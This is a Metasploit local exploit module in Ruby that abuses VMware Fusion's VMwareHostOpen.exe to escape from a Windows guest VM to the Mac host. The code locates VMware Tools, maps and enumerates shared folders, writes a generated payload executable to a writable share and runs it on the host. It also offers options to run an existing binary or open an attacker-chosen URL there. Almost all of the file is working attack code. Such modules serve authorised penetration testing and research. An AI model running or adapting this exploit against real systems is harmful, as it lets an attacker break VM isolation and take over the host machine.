##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit4 < Msf::Exploit::Local

  include Msf::Exploit::EXE
  include Msf::Post::File

  def initialize(info={})
    super( update_info( info, {
        'Name'          => 'VMWare VMwareHostOpen Local Host Escalation',
        'Description'   => %q{
          All modern VMWare Fusion versions are vulnerable to abuse of the
          VMwareHostOpen.exe functionality to open a file or URL from a Windows
          guest VM, using the *default* application on the Mac host. Currently 
          (see TODOs below), only if there is a writable share between the VM
          and the host, will the file's contents be completely attacker 
          controlled. File paths and URLs are attacker controlled regardless. 
          Currently this module depends on 2 binaries provided by VMware Tools, 
          however we should be able to bypass it using the Backdoor functionality
          provided in the VMware post library.

          TODO: Eliminate deps on VMware Tools by calling the Backdoor directly.
                This could potentially make this exploit module into a "multi"
                whereas currently it's limited to a Windows target VM.
          TODO: If not, daemon capability and wait for share to become writable.
        },
        'License'       => MSF_LICENSE,
        'Author'        =>
          [
            'Abdul-Aziz Hariri', # ZDI. Vulnerability discovery
            'kernelsmith' # ZDI. POC & Metasploit module
          ],
        'Platform'      => %w|python win osx|, # Host must be Mac, and
                           # currently guest must be Windows, but we need to
                           # allow Mac-compat payloads and pretend we support
                           # Windows platform because the local exploit module
                           # type is being overloaded here. Otherwise we get
                           # warnings and fatal incompatibility errors. We may
                           # need to create a new local exploit type, or find a
                           # way to accomodate guest platform/target vs host
                           # platform/target within locals. In its current form
                           # it's easy for a user to select payloads that will
                           # never actually work, which is of course not great
        'Targets'       => [
          [ 'Mac OS X Host (Universal Native Payload)',
            {
              'Platform' => 'osx',
              'Arch' => ARCH_X64
            }
          ],
          # would only work if the Mac had python as the default handler for .py files
          # most setups have .py files associated w/the default text editor
          # [ 'Mac OS X Host (Python)',
          #   {
          #     'Platform' => 'python',
          #     'Arch' => ARCH_PYTHON
          #   }
          # ],
        ],
        'DefaultOptions' => {
          "PrependSetresuid" => true, # @TODO: need?
          "PrependSetresgid" => true, # @TODO: need?
          "PrependFork" => true, # @TODO: need?
        },
        'Privileged'     => true,
        'DefaultTarget' => 0,
        'References' => [
          [ 'URL', 'https://www.thezdi.com/blog/2017/10/04/vmware-escapology-how-to-houdini-the-hypervisor' ]
       ],
        'DisclosureDate' => "Jul 22 2015"
      }
    ))

    register_options([
      OptString.new('VMWARE_TOOLS_PATH', [false, 'Do not search for ' +
        'VMware Tools, use this path.', nil]),
      OptString.new('RUN_EXISTING', [false, 'Do not look for writable shares, '+
        'just run this existing cmd/bin', nil]),
      OptBool.new('OPEN_URL', [false, "Don't open a payload, instead open URL " +
        "in host's default browser", nil])
    ], self.class)

    # first 4 could be constants, leaving as vars in case names start to change
    @host_open_bin_name = 'VMwareHostOpen.exe'
    @host_share_bin_name = 'VMwareHgfsClient.exe'
    @host_tools_dir_name = 'VMware Tools'
    @vmware_shared_folders = '\\\\vmware-host\\Shared Folders'
    @vmware_tools_path = nil
    @vmware_host_open_path = nil
    @vmware_host_share_path = nil
    @enabled_vm_shares = []
    @vmware_tools_not_installed_msg = "VMware Tools NOT installed.  If you know"+
          " for a fact they are installed, consider setting VMWARE_TOOLS_PATH."
    @useful_dirs = %w{%ProgramFiles%\\vmware
                      %ProgramW6432%\\vmware
                      %ProgramFiles% 
                      %SystemRoot% %SystemDrive%}
  end


  # check if the target is vulnerable, also set up required variables
  def check
    find_vmware_tools
    if vmware_tools_installed?
      vprint_status "VMware tools installed."
      find_vmware_host_open_bin
      if found_vmware_host_open_bin?
        vprint_good "Found #{@host_open_bin_name}"
        if !skip_share_check?
          find_vmware_host_share_bin
          if found_vmware_host_share_bin?
            vprint_good "Found #{@host_share_bin_name}"
            # we must also check if writable shares
            find_enabled_vm_shares
            if !found_enabled_vm_shares?
              # no enabled shares (boo), but all may not be lost
              print_error "No shared folders appear to be enabled."
              CheckCode::Detected
            else
              print_good "VM shares are enabled and active. We'll try to write to one"
              # It turns out there is no way, that I know of, to properly check
              # the write status of vmware shares. I've tried filestat stuff,
              # cacls, icacls etc. Seems VMware makes the writable decision
              # independent of the OS and simply errors the write request if the
              # VMware setting does not permit write. Therefore, we must attempt
              # to write to a share to truly find out if it's writable so I
              # removed checks and just try each one during exploitation instead
              # of during the check method which would just add additional noise
              print_status "You may find something useful on the shares to run if you can't write"
              CheckCode::Appears
            end
          else
            vprint_error "Could not find #{@host_share_bin_name}"
            CheckCode::Detected
          end
        else
          # we skipped the check because we are running a pre-existing cmd/bin
          # or opening a URL however, the prereqs are met up to this point so:
          vprint_status "Skipping check for writable shares as RUN_EXISTING is set"
          CheckCode::Appears
        end
      else
        vprint_error "Could not find #{@host_open_bin_name}"
        CheckCode::Detected
      end
    else
      # vmware tools not installed
      vprint_error @vmware_tools_not_installed_msg
      CheckCode::Safe
    end
  end

  def exploit
    check_result = check
    if check_result == CheckCode::Safe
      if !vmware_tools_installed?
        fail_with(Failure::NotVulnerable, @vmware_tools_not_installed_msg)
      elsif !found_vmware_host_open_bin?
        fail_with(Failure::NotVulnerable, "VMware Tools appear to be installed," +
                                        " but #{@host_open_bin_name} not found")
      elsif !found_vmware_host_share_bin?
        fail_with(Failure::NotVulnerable, "VMware Tools appear to be installed," +
                                        " but #{@host_share_bin_name} not found")
      elsif enabled_vm_shares.empty?
        fail_with(Failure::NotVulnerable, "vmware tools installed, " +
            "but no enabled shared folders found, try RUN_EXISTING or OPEN_URL")
      end
    end

    success = false
    no_more_tries = false
    shares_to_try = @enabled_vm_shares.dup
    pay_name =  Rex::Text.rand_text_alpha(rand(6)+2)

    until success || no_more_tries
      if !skip_share_check?
        # grab the first share
        share_used = shares_to_try.shift
        if share_used
          # TODO: Switch to using this instead of hardcoding '\\'
          # Rex::Post::File.join()
          #pay_vm_path = Rex::Post::File.join(@vmware_shared_folders, share_used, pay_name)

          # There seems to be a bug in the windows meterpreter file actions where
          # you can't specify a '\\' or 'Z:\' type absolute path. When you do,
          # it's not recognized as an absolute path and it gets appended to PWD
          # so we're working around that.
          # So we check if shares are mounted, if not, we mount
          vprint_status "Checking if Shared Folders are mapped"
          output = cmd_exec('net use').strip
          vprint_status "Command output is (#{output})"
          need_to_unmap = false
          mp = nil
          if output
            output.lines do |line|
              if line =~ /vmware-host/
              # Z:        \\vmware-host\Shared Folders
              # it seems mounted, let's try to get the mount point if there is one
                line.strip!
                if line
                  mp = line.split(/\s/).first
                  vprint_good "mp is (#{mp.to_s})"
                  break
                end
              end
            end
            if !mp.blank?
              vprint_status("Looks like Shares are mapped to #{mp}")
            else
              fail_with("Could not determine mount point for VM Shares")
            end
          else
            vprint_status("Doesn't look like Shares are mapped, let's try to map")
            output = cmd_exec('net use * "\\\\vmware-host\\Shared Folders" /PERSISTENT:NO').strip
            if output && output =~ /Drive [a-zA-Z]: is now connected/
              mp = output.split(/\s/)[1]
              need_to_unmap = mp
              vprint_status("Success, mapped to #{mp}")
            else
              fail_with("Could not find or create a mount point for the VM shares")
            end
          end

          pay_vm_dir = ["#{mp}", share_used].join('\\')
          # I can't get this to work if I put quotes around the final name, even
          # tho that's the smart thing to do in case the share name has a space
          pay_vm_path = "#{[pay_vm_dir, pay_name].join('\\')}"
          begin
            vprint_status "Attempting to write #{pay_name}"
            if write_file(pay_name, generate_payload_exe)
              vprint_status("Attempting to move #{pay_name} to #{pay_vm_path}")
              if rename_file(pay_name, pay_vm_path)
                print_good("Payload written to #{pay_vm_path}")
                success = true
              else
                print_bad("Unable to move payload to #{pay_vm_path}")
              end
            else
              print_error("Unable to write file to #{pay_vm_path}")
            end
            #print_status "Removing read-only attribute"
            #cmd_exec("attrib" ['-R', "\"#{pay_vm_path}\""])
            print_status "Executing payload #{pay_vm_path}"
            # TODO: the cmd run by execute_on_host will fail if the vm config
            #       doesn't allow it, can we detect that before trying?
            output = execute_on_host(pay_vm_path).strip
            vprint_status("Command output is (#{output})")
            #if output.blank?
              # unfortunately it's blank either way because it pops a GUI error msg, not stderr
              print_status("FYI the payload cannot be deleted while it's in use.")
              # TODO: Could do this if we don't unmap the network drive at the end
              # print_status "Daemonizing a script to delete it when it closes."
              # del_loop = %Q{start /B cmd /c :do & del "#{@pay_vm_path}" >nul 2>&1 &
              #  if exist "#{@pay_vm_path}" goto do & exit /b}
              # cmd_exec(del_loop)
            #end
          rescue Rex::Post::Meterpreter::RequestError => e
            print_status "Can't write to #{pay_vm_path}, trying next share"
            vprint_error "The error was #{e}"
          end
        else
          no_more_tries = true
        end
      else
        pay_vm_path = datastore['RUN_EXISTING'] || datastore['OPEN_URL']
        print_status("#{datastore['OPEN_URL'] ? 'Opening' : 'Executing'} #{pay_vm_path}")
        if execute_on_host(pay_vm_path)
          print_good "Execution successful"
          success = true
        else
          fail_with(Failure::NoAccess,"Unable to execute")
        end
        no_more_tries = true # break regardless since we aren't looking for shares to use
      end
    end # end until
    if success
      print_status "File or URL successfully opened with default application"
    elsif no_more_tries
      print_error "No attempts successfully opened the file or URL"
    end
    cmd_exec("net use #{need_to_unmap} /DELETE") if need_to_unmap
  end
  #
  # HKEY_LOCAL_MACHINE\SOFTWARE\VMware, Inc.\VMwareHostOpen\Capabilities\UrlAssociations
  #
  def skip_share_check?
    !!(datastore['RUN_EXISTING'] || datastore['OPEN_URL'])
  end

  def execute_on_host(vm_file_path)
    # "\\\\vmware-host\\Shared Folders\\sharename\\ix"
    bat = Rex::Text.rand_text_alpha(rand(3)+3) + '.bat'
    begin
      cmd_output = ""
      if datastore['OPEN_URL']
        args = ['--url', vm_file_path] # vm_file_path should already quoted
        vprint_status "Running #{@vmware_host_open_path} #{args.join(' ')}"
        command_output = cmd_exec(@vmware_host_open_path + args.join(' '))
      else
        args = ['--file', vm_file_path] # vm_file_path should already be quoted
        vprint_status "Running #{@vmware_host_open_path} #{args.join(' ')}"
        # NOTE:
        # cmd_exec is supposed to take an array of args as a 2nd param, but
        # whenever I do it, procmon shows the args don't get processed, they just
        # show up as a string like: ["--file", "Z:\\\\derbycon2017\\mktgzGW"] so
        # I went back to using one big cmd string
        command_output = cmd_exec(@vmware_host_open_path + args.join(' '))
      end
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error("Could not execute on host")
      vprint_status "Can't execute #{@vmware_host_open_path} #{args.join(' ')}, error was #{e}"
      fail_with(Failure::NotFound, e.to_s)
    end
    command_output || ''
  end

  # find vmware tools on the target VM.  In theory you can consult the registry
  # to find it, however if that fails, then: if dirs are given, only dirs will
  # be searched, otherwise dirs will be searched in the following order:
  # %ProgramFiles%\\vmware, %ProgramFiles%, %SystemRoot%, %SystemDrive%
  # Note, searching SystemRoot and SystemDrive will take quite a while

  # TODO: Properly support 64bit vs x86
  def find_vmware_tools(dirs = [])
    overridden_path = datastore['VMWARE_TOOLS_PATH']
    if overridden_path
      # search has been overridden, just go with it, if it's there
      if exist?(overridden_path)
        @vmware_tools_path = overridden_path
      else
        @vmware_tools_path = nil
      end
    else
      # TODO: first check the registry, gave up on this for now
      if false #registry_succeeds
        #@vmware_tools_path = registry
      else
        # otherwise check the dirs
        if dirs.empty?
          # use predefined list of dirs
          dirs = @useful_dirs
        end
        dirs.each do |d|
          path = "#{expand_path(d)}\\#{@host_tools_dir_name}"
          vprint_status "Looking for #{path}"
          if exist?(path)
            @vmware_tools_path = expand_path(path)
            break
          end
        end
      end
    end
    @vmware_tools_path
  end

  def vmware_tools_installed?
    !!(@vmware_tools_path)
  end

  # find VMwareHostOpen.exe on the target VM.
  def find_vmware_host_open_bin
    path = "#{@vmware_tools_path}\\#{@host_open_bin_name}"
    vprint_status "Looking for #{path}"
    @vmware_host_open_path = "\"#{expand_path(path)}\"" if exist?(path)
  end

  def found_vmware_host_open_bin?
    !!(@vmware_host_open_path)
  end

  def find_vmware_host_share_bin
    path = "#{@vmware_tools_path}\\#{@host_share_bin_name}"
    vprint_status "Looking for #{path}"
    @vmware_host_share_path = expand_path(path) if exist?(path)
  end

  def found_vmware_host_share_bin?
    !!(@vmware_host_share_path)
  end

  # NOTE: I gave up on all this, but am including it so you know I tried ;)

  # Checks if the directory is writable in the target
  # def writable_dir?(path)
  #   # vmware shared folders don't use the typical permissions or mount processes
  #   #   therefore, icacls and dir commands don't reveal useful info
  #   # icacls "\\vmware-host\Shared Folders\"
  #   #   \\vmware-host\Shared Folders\  No permissions are set. All users have full control.
  #   #   Successfully processed 1 files; Failed processing 0 files
  #   # this happens whether the share is writable or not
    
  #   # cacls "\\vmware-host\Shared Folders\"
  #   #   The Cacls command can be run only on disk drives that use the NTFS file system.

  #   # there's no good way to do this.  Could try railgun or:
  #   # cmd_exec("icacls #{path} /q")
  #   # grep out the accounts/groups that have the (F) perm
  #   # check if we are running as one of those accounts or are in one of those
  #   # groups with cmd_exec("net localgroup #{groupname}")
  #   # sounds like a lot of work, instead we'll just do a test write
  #   rand_str = Rex::Text.rand_text_alpha(16) + '.tmp'
  #   file_path = "#{path}\\#{rand_str}" # windows only so \\ is ok for now
  #   written = false
  #   begin
  #     written = write_file(file_path)
  #   rescue
  #     # swallow it.  not supposed to do this, too bad, I don't care for now
  #     nil
  #   end
  #   # we don't rescue the rm_f cuz we care if it fails
  #   rm_f(file_path) if written
  #   written
  # end

  def find_enabled_vm_shares
    @enabled_vm_shares = []
    # TODO: Remove this dependency using the Backdoor commands instead
    hgfs_share_results = cmd_exec("#{@vmware_host_share_path}")
    if hgfs_share_results
      hgfs_share_results.lines { |vmshare| @enabled_vm_shares << vmshare.strip }
    end
    @enabled_vm_shares.compact!
    vprint_status "Enabled shares: #{@enabled_vm_shares.join(',')}"
    @enabled_vm_shares
  end

  def found_enabled_vm_shares?
    !@enabled_vm_shares.empty?
  end

end
